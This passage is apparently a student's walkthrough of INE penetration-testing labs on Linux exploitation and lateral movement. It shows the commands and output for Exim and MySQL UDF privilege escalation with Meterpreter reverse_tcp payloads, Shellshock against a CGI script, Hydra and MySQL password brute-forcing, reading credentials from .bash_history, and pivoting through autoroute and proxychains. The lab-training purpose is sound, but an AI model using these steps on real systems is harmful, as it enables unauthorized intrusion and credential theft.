105513649   36 -rwsr-xr-x   1 root     root        36592 May 16  2017 /usr/bin/newgrp
105513479   72 -rwsr-xr-x   1 root     root        72280 May 16  2017 /usr/bin/gpasswd
3703455    820 -rwsr-xr-x   1 root     root       838937 Jan 24  2022 /usr/exim/bin/exim-4.89-2
```

`uname -a`: [✗]
```
Linux demo.ine.local 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

`exit`, `bg`, `/usr/share/linux-exploit-suggester/linux-exploit-suggester.sh -k 5.4.0`: [✗]
```
Available information:

Kernel version: 5.4.0
Architecture: N/A
Distribution: N/A
Distribution version: N/A
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): N/A
Package listing: N/A

Searching among:

73 kernel space exploits
0 user space exploits

Possible Exploits:

```

`searchsploit exim 4.89`: [✓]
```
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exim 4.87 < 4.91 - (Local / Remote) Command ← Execution                                                               | linux/remote/46974.txt
Exim 4.89 - 'BDAT' Denial of Service                                                                                | multiple/dos/43184.txt
Exim < 4.90.1 - 'base64d' Remote Code Execution                                                                     | linux/remote/44571.py
PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution                                                            | php/webapps/42221.py
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

`search exim`, `use exploit/linux/local/exim4_deliver_message_priv_esc`, `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, `show options`, `set SESSION 1`, `set LHOST 192.45.82.2`, `exploit -j`. [✓]

`sysinfo`:
```
Computer     : demo.ine.local
OS           : Ubuntu 14.04 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

`getuid`:
```
Server username: root ←
```

`ls /root`:
```
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  3106  fil   2014-02-20 08:13:56 +0530  .bashrc
100644/rw-r--r--  140   fil   2014-02-20 08:13:56 +0530  .profile
100644/rw-r--r--  33    fil   2022-01-24 13:37:35 +0530  FLAG2
```

`cat /root/FLAG2`:
```
79ff114680e11e44a71d773068485a9e ←
```

**Step 5**.

`exit`, `ipconfig`:
```
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface  2
============
Name         : ip_vti0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1480
Flags        : NOARP


Interface 339459
============
Name         : eth0
Hardware MAC : 02:42:c0:1a:15:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.26.21.3
IPv4 Netmask : 255.255.255.0


Interface 339461
============
Name         : eth1
Hardware MAC : 02:42:c0:18:35:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.24.53.2 ←
IPv4 Netmask : 255.255.255.0 ←
```

`run autoroute -s 192.24.53.0/24`: [✓]
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.24.53.0/255.255.255.0...
[+] Added route to 192.24.53.0/255.255.255.0 via 192.26.21.3 ←
[*] Use the -p option to list all active routes
```

`run autoroute -p`: [✓]
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.24.53.0        255.255.255.0      Session 2 ←
```

`bg`, `proxychains --version`, `cat /etc/proxychains4.conf`: [✓]
```
...

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050 ←
```

`search socks`, `use auxiliary/server/socks_proxy`, `show options`, `set SRVPORT 9050`, `set VERSION 4a`, `run`. [✓]

**Step 6**.

`search ping sweep`, `use post/multi/gather/ping_sweep`, `show options`, `set RHOSTS 192.21.171.0/24`, `set SESSION 2`, `run`: [✓]
```
[*] Performing ping sweep for IP range 192.21.171.0/24
[+]     192.21.171.3 host found ←
[+]     192.21.171.1 host found ←
[+]     192.21.171.2 host found
[*] Post module execution completed
```

`search portscan`, `use auxiliary/scanner/portscan/syn`, `show options`, `set RHOSTS 192.21.171.1,3`, `set PORTS 1-999`: [✓]
```
SIOCSIFFLAGS: Operation not permitted

[+]  TCP OPEN 192.21.171.1:22 ←
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
```

`search portscan`, `use auxiliary/scanner/portscan/tcp`, `show options`, `set RHOSTS 192.21.171.1,3`, `set PORTS 1-999`: [✓]
```
[+] 192.21.171.1:         - 192.21.171.1:22 - TCP OPEN ←
[*] 192.21.171.1,3:       - Scanned 1 of 2 hosts (50% complete)
[+] 192.21.171.3:         - 192.21.171.3:80 - TCP OPEN ←
[*] 192.21.171.1,3:       - Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
```

`proxychains nmap -sS -sV 192.21.171.1,3 -p22,80 -Pn`: [✓]
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-10 13:36 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.21.171.1:22  ...  OK
Nmap scan report for linux (192.21.171.1) ←
Host is up (0.000026s latency).

PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) ←
80/tcp filtered http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.21.171.3
Host is up.

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp filtered http

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 13.62 seconds
```

`proxychains nmap -sT -sV 192.21.171.1,3 -p22,80 -Pn --open`: [✓]
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-10 13:41 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.21.171.3:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.21.171.1:80 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.21.171.3:22 <--denied

...

Nmap scan report for linux (192.21.171.1) ←
Host is up (0.97s latency).
Not shown: 1 closed tcp port (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) ←
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.21.171.3 ←
Host is up (0.052s latency).
Not shown: 1 closed tcp port (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ←
Service Info: Host: demo2.ine.local

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 25.30 seconds
```

**Step 7**.

`proxychains hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.21.171.1 ssh -t 4`. [✗]

`proxychains hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.21.171.1 ssh -t 4`. [✗]

`proxychains curl 192.21.171.3`: [✓]
```
[*] exec: proxychains curl 192.21.171.3

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.21.171.3:80  ...  OK
<html>
<head>
<title>AttackDefense</title>
</head>
<body>
</br>
<iframe frameborder=0 width=800 height=600 src="/cgi-bin/stats"></iframe> ←
</body>
</html>
```

`search apache cgi`, `use auxiliary/scanner/http/apache_mod_cgi_bash_env`, `show options`, `set RHOSTS 191.171.21.3`, `set TARGETURI /cgi-bin/stats`, `exploit`: [✓]
```
[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`search apache cgi`, `use exploit/multi/http/apache_mod_cgi_bash_env_exec`, `set PAYLOAD linux/x86/meterpreter/bind_tcp`, `show options`, `set RHOSTS 191.171.21.3`, `set TARGETURI /cgi-bin/stats`, `set LHOST 192.119.153.2`, `exploit`. [✓]

`sysinfo`:
```
Computer     : demo2.ine.local
OS           : Debian 7.11 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

`getuid`:
```
Server username: www-data ←
```

**Step 8**.

`uname -a`: [✗]
```
Linux demo2.ine.local 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
```

`find / -type f -perm -4000 2> /dev/null`: [✗]
```
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/bin/ping
/usr/lib/pt_chown
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
```

`sudo`: [✗]
```
/bin/sh: 4: sudo: not found
```

---

### Linux Exploitation: Lab 4 - Lateral Movement - Lab

You will learn to find and exploit vulnerable services in this lab. It will also cover post-exploitation and lateral movement techniques to extract sensitive information to progressively move through a network.

In this lab environment, the user will access a Kali GUI instance. A vulnerable application can be accessed using the tools installed on Kali at `http://demo.ine.local`.

Objective: Exploit both the target and find all flags!

Dictionaries to use:
- `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

The best tools for this lab are:
- Metasploit Framework
- Nmap
- Bash Shell
- Hydra
- MySQL Client

---

**Step 1**.

`ping demo.ine.local -c 3`:
```
PING demo.ine.local (192.42.192.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.42.192.3): icmp_seq=1 ttl=64 time=0.114 ms
64 bytes from demo.ine.local (192.42.192.3): icmp_seq=2 ttl=64 time=0.054 ms
nma64 bytes from demo.ine.local (192.42.192.3): icmp_seq=3 ttl=64 time=0.054 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms ←
rtt min/avg/max/mdev = 0.054/0.074/0.114/0.028 ms
```

`ip addr | grep inet`:
```
inet 127.0.0.1/8 scope host lo
inet 10.1.0.6/16 brd 10.1.255.255 scope global eth0
inet 192.42.192.2/24 brd 192.42.192.255 scope global eth1 ←
```

`nmap -sT demo.ine.local`: [✓]
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-29 20:14 IST
Nmap scan report for demo.ine.local (192.254.213.3)
Host is up (0.00013s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh ←
79/tcp open  finger ←
MAC Address: 02:42:C0:FE:D5:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```

**Step 2A**.

`locate finger-user-enum`:
```
/root/Desktop/tools/finger-user-enum
/root/Desktop/tools/finger-user-enum/CHANGELOG
/root/Desktop/tools/finger-user-enum/COPYING
/root/Desktop/tools/finger-user-enum/COPYING.GPL
/root/Desktop/tools/finger-user-enum/LICENSE
/root/Desktop/tools/finger-user-enum/README.md
/root/Desktop/tools/finger-user-enum/finger-user-enum-user-docs.pdf
/root/Desktop/tools/finger-user-enum/finger-user-enum.pl
```

`/root/Desktop/tools/finger-user-enum/finger-user-enum.pl -U /usr/share/metasploit-framework/data/wordlists/common_users.txt -t demo.ine.local`: [✓]
```
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/metasploit-framework/data/wordlists/common_users.txt
Target count ............. 1
Username count ........... 8
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Thu Feb 29 20:13:00 2024 #########
rooty@demo.ine.local: finger: rooty: no such user...
administrator@demo.ine.local: finger: administrator: no such user...
demo@demo.ine.local: finger: demo: no 
sysadmin@demo.ine.local: Login: sysadmin ←                       Name: ..Directory: /home/sysadmin               Shell: /bin/bash..Never logged in...No mail...No Plan...
bob@demo.ine.local: finger: bob: no s
auditor@demo.ine.local: Login: auditor ←                         Name: ..Directory: /home/auditor                Shell: /bin/bash..Never logged in...No mail...No Plan...
anon@demo.ine.local: finger: anon: no 
diag@demo.ine.local: fing
######## Scan completed at Thu Feb 29 20:13:00 2024 #########
8 results.

8 queries in 1 seconds (8.0 queries / sec)
```

`finger sysadmin@demo.ine.local`:
```
Login: sysadmin                         Name: 
Directory: /home/sysadmin               Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

`finger auditor@demo.ine.local`:
```
Login: auditor                          Name: 
Directory: /home/auditor                Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

**Step 2B**.

`msfconsole -q`, `search finger`, `use auxiliary/scanner/finger/finger_users`, `show options`, `set RHOSTS demo.ine.local`, `run`: [✓]
```
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: auditor ←
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: backup
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: bin
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: daemon
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: games
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: gnats
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: irc
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: libuuid
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: list
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: lp
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: mail
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: man
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: mysql
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: news
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: nobody
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: proxy
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: root
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: sshd
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: sync
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: sys
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: sysadmin ←
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: syslog
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: uucp
[+] 192.192.209.3:79      - 192.192.209.3:79 - Found user: www-data
[+] 192.192.209.3:79      - 192.192.209.3:79 Users found: auditor, backup, bin, daemon, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, proxy, root, sshd, sync, sys, sysadmin, syslog, uucp, www-data
[*] demo.ine.local:79     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Step 3**.

`echo -e "sysadmin\nauditor" > /root/Desktop/users.txt`

`hydra -L /root/Desktop/users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ssh`: [✓]
```
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-29 21:09:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2018 login tries (l:2/p:1009), ~127 tries per task
[DATA] attacking ssh://demo.ine.local:22/
[22][ssh] host: demo.ine.local   login: sysadmin   password: monkey ←
```

`ssh sysadmin@demo.ine.local`. [✓]

`id`:
```
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin) ←
```

`msfconsole -q`, `search ssh login`, `use auxiliary/scanner/ssh/ssh_login`, `set RHOSTS demo.ine.local`, `set USERNAME sysadmin`, `set PASSWORD monkey`, `exploit -j`. [✓]

`search shell meterpreter`, `use post/multi/manage/shell_to_meterpreter`, `show options`, `set SESSION 1`, `set LHOST 192.113.30.2`, `exploit -j`. [✓]

`sessions`, `sessions -i 2`, `sysinfo`:
```
Computer     : demo.ine.local
OS           : Ubuntu 14.04 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

`getuid`:
```
Server username: sysadmin ←
```

**Step 4**.

`sudo -l`: [✗]
```
[sudo] password for sysadmin: 
Sorry, user sysadmin may not run sudo on demo.
```

`find / -type f -perm -4000 -uid 0 2> /dev/null`: [✗]
```
/bin/umount
/bin/ping6
/bin/ping
/bin/su
/bin/mount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
```

`ps aux`: [✓]
```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4452   768 ?        Ss   14:33   0:00 /bin/sh -c /usr/local/bin/start.sh
root           7  0.0  0.0  17976  2964 ?        S    14:33   0:00 /bin/bash /usr/local/bin/start.sh
root         140  0.0  0.0   4452  1672 ?        S    14:33   0:00 /bin/sh /usr/bin/mysqld_safe ←
root         518  0.0  0.0 568336 63672 ?        Sl   14:33   0:03 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysq ←
root         612  0.0  0.0  61388  3532 ?        Ss   14:33   0:00 /usr/sbin/sshd
root         708  0.0  0.0  12824  1848 ?        S    14:33   0:00 /usr/sbin/inetutils-inetd
root         709  0.0  0.0  52100 16660 ?        S    14:33   0:00 /usr/bin/python /usr/bin/supervisord -n
root        2296  0.0  0.0  90480  5952 ?        Ss   15:42   0:00 sshd: sysadmin [priv]
sysadmin    2307  0.0  0.0  90480  4400 ?        R    15:42   0:00 sshd: sysadmin@pts/0
sysadmin    2308  0.0  0.0  18200  3348 pts/0    Ss   15:42   0:00 -bash
sysadmin    2323  0.0  0.0  15576  2192 pts/0    R+   15:47   0:00 ps aux
```

We can observe that the MySQL server is running with the root user. However, we haven't discovered the MySQL default port `3306` while scanning the target machine. Let's check all bind ports on the target machine.

`netstat -a`: [✓]
```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:mysql         *:*                     LISTEN ←    
tcp        0      0 *:finger                *:*                     LISTEN     
tcp        0      0 *:ssh                   *:*                     LISTEN     
tcp        0      0 localhost:46717         *:*                     LISTEN     
tcp        0      0 demo.ine.local:ssh      INE:40438               ESTABLISHED
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
udp        0      0 localhost:51196         *:*                                
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     1621852593 /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     1621924982 /var/run/supervisor.sock.709
unix  3      [ ]         STREAM     CONNECTED     1622500809 
unix  3      [ ]         STREAM     CONNECTED     1622500810 
```

We can observe MySQL is running on `localhost:mysql` (port `3306`). This is why we have not discovered the server. It is not exposed to the public IP address.

**Step 5**.

We can forward the port using SSH tunneling and access port `3306` on the attacker's machine local port.
Let's exit the SSH active session and forward the target local port `3306` to the attacker's machine port `1234` using ssh.

`ssh -4 -L 1234:127.0.0.1:3306 sysadmin@demo.ine.local`. [✓]

We can verify it by running the netstat command on the attacker machine.

`netstat -a | grep "1234"`: [✓]
```
tcp        0      0 localhost:1234          0.0.0.0:*               LISTEN ←
```

`nmap -sS -sV localhost -p1234`: [✓]
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-10 20:29 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000049s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1 ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

**Step 6**.

`search mysql login`, `use auxiliary/scanner/mysql/mysql_login`, `show options`, `set RHOSTS localhost`, `set RPORT 1234`, `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`, `set STOP_ON_SUCCESS true`, `set VERBOSE false`, `exploit`: [✓]
```
[+] 127.0.0.1:1234        - 127.0.0.1:1234 - Success: 'root:nirvana' ←
[*] localhost:1234        - Scanned 1 of 2 hosts (50% complete)
[*] localhost:1234        - Scanned 1 of 2 hosts (50% complete)
[*] localhost:1234        - Scanned 1 of 2 hosts (50% complete)
[*] localhost:1234        - Scanned 1 of 2 hosts (50% complete)
[*] localhost:1234        - Scanned 1 of 2 hosts (50% complete)
[*] localhost:1234        - Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
```

`search mysql udf`, `use exploit/multi/mysql/mysql_udf_payload`, `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, `show options`, `set RHOSTS localhost`, `set RPORT 1234`, `set PASSWORD nirvana`, `set LHOST 192.122.196.2`, `set FORCE_UDF_UPLOAD false`, `show targets`, `set TARGET Linux`, `exploit -j`. [✓] 

**Step 7**.

`sessions -i 2`, `sysinfo`:
```
Computer     : demo.ine.local
OS           : Ubuntu 14.04 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

`getuid`:
```
Server username: root ←
```

`ls /root`: [✓]
```
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  3106  fil   2014-02-20 08:13:56 +0530  .bashrc
100644/rw-r--r--  140   fil   2014-02-20 08:13:56 +0530  .profile
100644/rw-r--r--  33    fil   2022-01-25 10:45:29 +0530  FLAG1 ←
```

`cat /root/FLAG1`: [✓]
```
39493c859daa977560a8ac0917edb054 ←
```

**Step 8**.

`ls /home/auditor`: [✓]
```
Listing: /home/auditor
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100664/rw-rw-r--  5990  fil   2024-04-10 19:38:50 +0530  .bash_history ←
100644/rw-r--r--  220   fil   2022-01-25 09:55:34 +0530  .bash_logout
100644/rw-r--r--  3637  fil   2022-01-25 09:55:34 +0530  .bashrc
100644/rw-r--r--  675   fil   2022-01-25 09:55:34 +0530  .profile
```

There is one `.bash_history` file present on the target machine. Let's read the file and check if we can get any interesting information.

`cat /home/auditor/.bash_history`: [✓]
```
groupadd mysql
useradd -r -g mysql mysql
mkdir -p /usr/local/src/mysql
cd /usr/local/src/mysql
wget http://cdn.mysql.com/Downloads/MySQL-5.6/mysql-5.6.10.tar.gz
tar xvfz mysql-5.6.10.tar.gz
cd mysql-5.6*
mysql -h 192.180.99.3 -u root -pfArFLP29UySm4bZj ←
rm CMakeCache.txt
cmake \
-DCMAKE_INSTALL_PREFIX=/usr/local/mysql-5.6.10 \
-DWITH_INNOBASE_STORAGE_ENGINE=1\
-DDEFAULT_CHARSET=utf8 \
-DDEFAULT_COLLATION=utf8_general_ci \
-DMYSQL_UNIX_ADDR=/tmp/mysql.sock \
-DSYSCONFDIR=/etc \
.
make
make install
ln -s /usr/local/mysql-5.6.10 /usr/local/mysql
cd /usr/local/mysql
cp ./support-files/my-default.cnf /etc/my.cnf
echo "character-set-server = utf8" >> /etc/my.cnf
echo "collation-server = utf8_general_ci" >> /etc/my.cnf
echo "character-set-client-handshake = false" >> /etc/my.cnf
chown -R root .
chgrp -R mysql .
chown -R mysql data
scripts/mysql_install_db --user=mysql
bin/mysqld_safe --user=mysql &
bin/mysqladmin -u root password 'new-password'
cp support-files/mysql.server /etc/init.d/mysql.server
ln -s /etc/init.d/mysql.server /etc/rc2.d/S90mysql
echo "export PATH=/usr/local/mysql/bin:$PATH" >> /etc/profile
if /etc/mysql/my.cnf file exists, sudo /etc/mysql/my.cnf /etc/mysql/my.cnf.old
cd /opt
wget http://www.morphisms.net/~wkj/download/libaio.tbz
bunzip2 libaio.tbz
tar xf libaio.tar
wget http://dev.mysql.com/get/Downloads/MySQL-5.5/mysql-5.5.8.tar.gz/from/http://mysql.llarian.net/
tar xzf mysql-5.5.8.tar.gz
cd mysql-5.5.8
PATH=$PATH:/opt/bison/bin   #bison binary should be in your path
/opt/cmake/bin/cmake . -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_FEDERATED_STORAGE_ENGINE=1 \
-DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DMYSQL_DATADIR=/opt/mysql-5.5.8/data/ \
-DCMAKE_INSTALL_PREFIX=/opt/mysql-5.5.8 -DCURSES_LIBRARY=/opt/ncurses/lib/libncurses.a \
-DCURSES_INCLUDE_PATH=/opt/ncurses/include/ -DHAVE_LIBAIO_H=/opt/libaio/include/ \
-DINSTALL_LAYOUT=STANDALONE -DENABLED_PROFILING=ON \
-DMYSQL_MAINTAINER_MODE=OFF -DWITH_DEBUG=OFF \
-DDEFAULT_CHARSET=utf8 -DENABLED_LOCAL_INFILE=TRUE -DWITH_ZLIB=bundled
make
make install
```

After investigating all the `.bash_history` commands, we have found that the user (`auditor`) has accessed another msql machine using CLI, which is running on the `192.180.99.3` host.

Let's run the `ping` command and verify that the host is still up and accessible.

`shell`, `ping -c 3 192.180.99.3`: [✓]
```
PING 192.180.99.3 (192.180.99.3) 56(84) bytes of data.
64 bytes from 192.180.99.3: icmp_seq=1 ttl=64 time=0.108 ms
64 bytes from 192.180.99.3: icmp_seq=2 ttl=64 time=0.045 ms
64 bytes from 192.180.99.3: icmp_seq=3 ttl=64 time=0.044 ms

--- 192.180.99.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2030ms ←
rtt min/avg/max/mdev = 0.044/0.065/0.108/0.031 ms
```

`exit`, `ipconfig`: [✓]
```
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface  2
============
Name         : ip_vti0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1480
Flags        : NOARP


Interface 324844
============
Name         : eth0
Hardware MAC : 02:42:c0:c0:d1:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.192.209.3
IPv4 Netmask : 255.255.255.0


Interface 324846
============
Name         : eth1
Hardware MAC : 02:42:c0:b4:63:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.180.99.2 ←
IPv4 Netmask : 255.255.255.0 ←
```

**Step 9**.

`run autoroute -s 192.180.99.0/24`: [✓]
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.180.99.0/255.255.255.0...
[+] Added route to 192.180.99.0/255.255.255.0 via 192.192.209.3 ←
[*] Use the -p option to list all active routes
```

`run autoroute -p`: [✓]
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.180.99.0       255.255.255.0      Session 1 ←
```

`bg`, `proxychains --version`: [✓]
```
[*] exec: proxychains --version

[proxychains] config file found: /etc/proxychains4.conf ←
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
proxychains can't load process....: No such file or directory
```

`cat /etc/proxychains4.conf`: [✓]
```
...

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050 ←
```

`search socks`, `use auxiliary/server/socks_proxy`, `show options`, `set SRVPORT 9050`, `set VERSION 4a`, `run`. [✓]

**Step 10**.

`search ping sweep`, `use post/multi/gather/ping_sweep`, `show options`, `set SESSION 2`, `set RHOSTS 192.180.99.0/24`, `run`: [✓]
```
[*] Performing ping sweep for IP range 192.180.99.0/24
[+]     192.180.99.1 host found
[+]     192.180.99.3 host found ←
[+]     192.180.99.2 host found
[*] Post module execution completed
```

`search portscan`, `use auxiliary/scanner/portscan/syn`, `show options`, `set RHOSTS 192.180.99.3`, `set PORTS 1-999`: [✗]
```
SIOCSIFFLAGS: Operation not permitted
```

`search portscan`, `use auxiliary/scanner/portscan/tcp`, `show options`, `set RHOSTS 192.180.99.3`, `set PORTS 1-999`: [✓]
```
[+] 192.180.99.3:         - 192.180.99.3:80 - TCP OPEN ←
[+] 192.180.99.3:         - 192.180.99.3:3306 - TCP OPEN ←
[*] 192.180.99.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

`proxychains nmap -sS -sV 192.180.99.3 -p80,3306`: [✗]
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
